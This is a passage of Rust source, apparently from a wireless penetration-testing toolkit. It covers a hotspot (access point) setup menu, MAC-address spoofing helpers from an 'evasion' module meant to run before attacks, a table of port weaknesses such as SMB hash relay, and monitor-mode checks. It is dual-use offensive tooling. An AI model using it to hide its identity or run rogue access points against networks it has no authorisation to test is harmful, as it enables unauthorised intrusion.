                        upstream_options.push("None (offline)".to_string());
                        upstream_options.extend(ethernet.clone());
                        upstream_options.extend(wifi.clone());

                        if upstream_options.is_empty() {
                            return self.show_message(
                                "Hotspot",
                                [
                                    "No interfaces detected",
                                    "",
                                    "Run Hardware Detect and",
                                    "ensure adapters are up.",
                                ],
                            );
                        }

                        let upstream_choice =
                            self.choose_from_menu("Internet (upstream)", &upstream_options)?;
                        let upstream_iface = match upstream_choice {
                            Some(0) => "".to_string(),
                            Some(idx) => upstream_options
                                .get(idx)
                                .cloned()
                                .unwrap_or_else(|| upstream_pref.clone()),
                            None => upstream_pref.clone(),
                        };
                        let mut upstream_note = String::new();
                        if upstream_choice == Some(0) {
                            upstream_note = "No upstream selected; hotspot will have no internet."
                                .to_string();
                        } else if !upstream_iface.is_empty() && !interface_has_ip(&upstream_iface) {
                            upstream_note = format!(
                                "{} has no IP; hotspot will be local-only until it connects.",
                                upstream_iface
                            );
                        }

                        // Build AP list (WiFi only, excluding upstream if same)
                        let ap_choices: Vec<String> = wifi
                            .iter()
                            .filter(|name| **name != upstream_iface)
                            .cloned()
                            .collect();

                        if ap_choices.is_empty() {
                            return self.show_message(
                                "Hotspot",
                                [
                                    "No WiFi interface left",
                                    "",
                                    "Select a different",
                                    "upstream interface.",
                                ],
                            );
                        }

                        let ap_iface = self
                            .choose_interface_name("Hotspot WiFi (AP)", &ap_choices)?
                            .unwrap_or_else(|| {
                                ap_choices
                                    .first()
                                    .cloned()
                                    .unwrap_or_else(|| "wlan0".to_string())
                            });

                        let args = HotspotStartArgs {
                            ap_interface: ap_iface.clone(),
                            upstream_interface: upstream_iface.clone(),
                            ssid: self.config.settings.hotspot_ssid.clone(),
                            password: self.config.settings.hotspot_password.clone(),
                            channel: 6,
                        };
                        match self
                            .core
                            .dispatch(Commands::Hotspot(HotspotCommand::Start(args)))
                        {
                            Ok((msg, data)) => {
                                let ssid = data
                                    .get("ssid")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or(&self.config.settings.hotspot_ssid)
                                    .to_string();
                                let password = data
                                    .get("password")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or(&self.config.settings.hotspot_password)
                                    .to_string();
                                self.config.settings.hotspot_ssid = ssid.clone();
                                self.config.settings.hotspot_password = password.clone();
                                let config_path = self.root.join("gui_conf.json");
                                let _ = self.config.save(&config_path);

                                // Keep AP/upstream/active interfaces alive, block others
                                let mut allow_list = vec![
                                    self.config.settings.active_network_interface.clone(),
                                    ap_iface.clone(),
                                    upstream_iface.clone(),
                                ];
                                allow_list.retain(|s| !s.is_empty());
                                if let Err(e) = self.apply_interface_isolation(&allow_list) {
                                    self.show_message(
                                        "Hotspot",
                                        [format!("Isolation failed: {}", e)],
                                    )?;
                                }

                                let upstream_line = if upstream_iface.is_empty() {
                                    "Upstream: none (offline)".to_string()
                                } else if data
                                    .get("upstream_ready")
                                    .and_then(|v| v.as_bool())
                                    .unwrap_or(true)
                                {
                                    format!("Upstream: {} (internet)", upstream_iface)
                                } else {
                                    format!("Upstream: {} (offline/no IP)", upstream_iface)
                                };

                                self.show_message(
                                    "Hotspot started",
                                    [
                                        msg,
                                        format!("SSID: {}", ssid),
                                        format!("Password: {}", password),
                                        format!("AP: {}", ap_iface),
                                        upstream_line,
                                        if upstream_note.is_empty() {
                                            "".to_string()
                                        } else {
                                            upstream_note.clone()
                                        },
                                        "".to_string(),
                                        "Turn off to exit this view".to_string(),
                                    ],
                                )?;
                            }
                            Err(e) => {
                                let err = e.to_string();
                                let mut lines = vec![
                                    "Failed to start hotspot".to_string(),
                                    shorten_for_display(&err, 90),
                                ];
                                if err.contains("AP mode") {
                                    lines.push("Selected AP interface may not support AP mode.".to_string());
                                }
                                if err.contains("Required tool missing") {
                                    lines.push("Install hostapd, dnsmasq, and iptables (installer covers this).".to_string());
                                }
                                if err.contains("Interface") {
                                    lines.push("Check interface selection/cabling or pick a different adapter.".to_string());
                                }
                                self.show_message("Hotspot error", lines)?;
                            }
                        }
                    }
                    (false, Some(1)) => {
                        #[cfg(target_os = "linux")]
                        {
                            let ssid = rustyjack_wireless::random_ssid();
                            self.config.settings.hotspot_ssid = ssid.clone();
                            let config_path = self.root.join("gui_conf.json");
                            let _ = self.config.save(&config_path);
                            self.show_message("Hotspot", ["SSID updated", &ssid])?;
                        }
                    }
                    (false, Some(2)) => {
                        #[cfg(target_os = "linux")]
                        {
                            let pw = rustyjack_wireless::random_password();
                            self.config.settings.hotspot_password = pw.clone();
                            let config_path = self.root.join("gui_conf.json");
                            let _ = self.config.save(&config_path);
                            self.show_message("Hotspot", ["Password updated", &pw])?;
                        }
                    }
                    (false, Some(3)) | (false, None) => return Ok(()),
                    _ => return Ok(()),
                }
            }
        }
    }
}

#[cfg(target_os = "linux")]
fn renew_dhcp_and_reconnect(interface: &str) -> bool {
    let dhcp_release = Command::new("dhclient").args(["-r", interface]).status();
    let dhcp_renew = Command::new("dhclient").arg(interface).status();
    let wpa = Command::new("wpa_cli")
        .args(["-i", interface, "reconnect"])
        .status();
    let nm = Command::new("nmcli")
        .args(["device", "reconnect", interface])
        .status();
    
    dhcp_renew.map(|s| s.success()).unwrap_or(false)
        || wpa.map(|s| s.success()).unwrap_or(false)
        || nm.map(|s| s.success()).unwrap_or(false)
}

#[cfg(target_os = "linux")]
fn generate_vendor_aware_mac(interface: &str) -> anyhow::Result<rustyjack_evasion::MacAddress> {
    use rustyjack_evasion::{MacAddress, VendorOui};

    let current = std::fs::read_to_string(format!("/sys/class/net/{}/address", interface))
        .ok()
        .and_then(|s| MacAddress::parse(s.trim()).ok());

    if let Some(mac) = current {
        if let Some(vendor) = VendorOui::from_oui(mac.oui()) {
            let mut candidate = MacAddress::random_with_oui(vendor.oui)?;
            let mut bytes = *candidate.as_bytes();
            // Preserve vendor flavor but force locally administered + unicast bits
            bytes[0] = (bytes[0] | 0x02) & 0xFE;
            candidate = MacAddress::new(bytes);
            return Ok(candidate);
        }
    }

    Ok(MacAddress::random()?)
}

#[cfg(target_os = "linux")]
fn randomize_mac_with_reconnect(interface: &str) -> anyhow::Result<(rustyjack_evasion::MacState, bool)> {
    use rustyjack_evasion::MacManager;

    let mut manager = MacManager::new().context("creating MacManager")?;
    manager.set_auto_restore(false);

    let new_mac = generate_vendor_aware_mac(interface)?;
    let state = manager
        .set_mac(interface, &new_mac)
        .context("setting randomized MAC")?;

    let reconnect_ok = renew_dhcp_and_reconnect(interface);
    Ok((state, reconnect_ok))
}

fn interface_has_ip(interface: &str) -> bool {
    #[cfg(target_os = "linux")]
    {
        let output = Command::new("ip")
            .args(["-4", "addr", "show", "dev", interface])
            .output();
        if let Ok(out) = output {
            let stdout = String::from_utf8_lossy(&out.stdout);
            return stdout.contains("inet ");
        }
        false
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = interface;
        false
    }
}

fn dir_has_files(dir: &Path) -> bool {
    if !dir.exists() {
        return false;
    }
    fs::read_dir(dir)
        .ok()
        .and_then(|mut it| it.next())
        .is_some()
}

fn shorten_for_display(value: &str, max_len: usize) -> String {
    if value.len() <= max_len {
        return value.to_string();
    }
    if max_len <= 3 {
        return value[..max_len.min(value.len())].to_string();
    }
    let keep = max_len - 3;
    let prefix = keep / 2;
    let suffix = keep - prefix;
    let start = &value[..prefix.min(value.len())];
    let end = &value[value.len().saturating_sub(suffix)..];
    format!("{start}...{end}")
}

fn port_role(port: u16) -> &'static str {
    match port {
        21 => "(ftp)",
        22 => "(ssh)",
        23 => "(telnet)",
        25 => "(smtp)",
        53 => "(dns)",
        80 => "(http)",
        110 => "(pop3)",
        139 => "(netbios)",
        143 => "(imap)",
        389 => "(ldap)",
        443 => "(https)",
        445 => "(smb)",
        465 => "(smtps)",
        587 => "(submission)",
        993 => "(imaps)",
        995 => "(pop3s)",
        1433 => "(mssql)",
        1521 => "(oracle)",
        1723 => "(pptp)",
        3306 => "(mysql)",
        3389 => "(rdp)",
        5432 => "(postgres)",
        5900 => "(vnc)",
        6379 => "(redis)",
        8080 => "(http-alt)",
        8443 => "(https-alt)",
        62078 => "(iphone-sync)",
        _ => "",
    }
}

fn port_weakness(port: u16) -> Option<&'static str> {
    match port {
        21 => Some("FTP (cleartext creds)"),
        23 => Some("Telnet (cleartext, legacy)"),
        25 => Some("SMTP (check open relay/unauth)"),
        110 | 143 => Some("Mail (POP/IMAP cleartext)"),
        139 | 445 => Some("SMB (lateral movement/hash relay)"),
        3389 => Some("RDP (remote access exposure)"),
        5900 => Some("VNC (weak/no auth common)"),
        3306 => Some("MySQL (DB exposure)"),
        5432 => Some("Postgres (DB exposure)"),
        6379 => Some("Redis (no auth by default)"),
        1521 => Some("Oracle DB (sensitive)"),
        1723 => Some("PPTP (weak VPN)"),
        62078 => Some("iTunes sync (device trust risk)"),
        _ => None,
    }
}

/// Auto-randomize MAC before attack if enabled in settings
/// Returns true if MAC was randomized (so caller knows to restore later)
pub fn auto_randomize_mac_if_enabled(
    interface: &str,
    settings: &crate::config::SettingsConfig,
) -> bool {
    if !settings.mac_randomization_enabled {
        return false;
    }

    #[cfg(target_os = "linux")]
    {
        randomize_mac_with_reconnect(interface).is_ok()
    }

    #[cfg(not(target_os = "linux"))]
    {
        false
    }
}

/// Restore original MAC from saved settings
pub fn restore_original_mac(interface: &str, original_mac: &str) -> bool {
    if original_mac.is_empty() {
        return false;
    }

    let _ = std::process::Command::new("ip")
        .args(["link", "set", interface, "down"])
        .output();

    let result = std::process::Command::new("ip")
        .args(["link", "set", interface, "address", original_mac])
        .output();

    let _ = std::process::Command::new("ip")
        .args(["link", "set", interface, "up"])
        .output();

    result.map(|o| o.status.success()).unwrap_or(false)
}

#[cfg(target_os = "linux")]
fn interface_wiphy(interface: &str) -> Option<String> {
    let output = std::process::Command::new("iw")
        .args(["dev", interface, "info"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        let line = line.trim();
        if let Some(rest) = line.strip_prefix("wiphy ") {
            return Some(rest.trim().to_string());
        }
    }
    None
}

#[cfg(target_os = "linux")]
fn check_monitor_mode_support(interface: &str) -> bool {
    if let Some(phy) = interface_wiphy(interface) {
        return std::process::Command::new("iw")
            .args(["phy", &format!("phy{}", phy), "info"])
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).contains("monitor"))
            .unwrap_or(false);
    }
    // Fallback
    std::process::Command::new("iw")
        .arg("list")
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).contains("monitor"))
        .unwrap_or(false)
}

#[cfg(not(target_os = "linux"))]
fn check_monitor_mode_support(_interface: &str) -> bool {
    true
}
